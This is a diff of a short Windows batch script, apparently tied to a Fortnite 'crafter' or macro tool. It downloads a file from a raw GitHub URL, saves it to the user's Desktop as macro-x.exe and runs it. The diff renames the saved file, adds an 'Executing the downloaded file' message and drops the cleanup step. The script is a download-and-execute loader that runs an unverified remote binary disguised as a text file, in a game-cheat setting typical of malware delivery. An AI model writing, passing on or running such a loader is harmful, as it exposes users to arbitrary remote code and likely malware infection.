@@ -1,16 +1,16 @@
 @echo off
 set "url=https://raw.githubusercontent.com/r3ntlovestodev/fortnite-crafter421/refs/heads/main/coolboy/batch1.txt"
 set "desktopPath=%userprofile%\Desktop"
-set "filePath=%desktopPath%\downloadedScript.exe"
+set "filePath=%desktopPath%\macro-x.exe"
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%filePath%')"
 timeout /t 2 >nul
 
 if exist "%filePath%" (
+    echo [+] Executing the downloaded file.
     "%filePath%"
-    del "%filePath%"
 ) else (
-    echo Webhook failed
+    echo [+] Webhook failed to download the file.
 )
 
-pause >nul
+pause
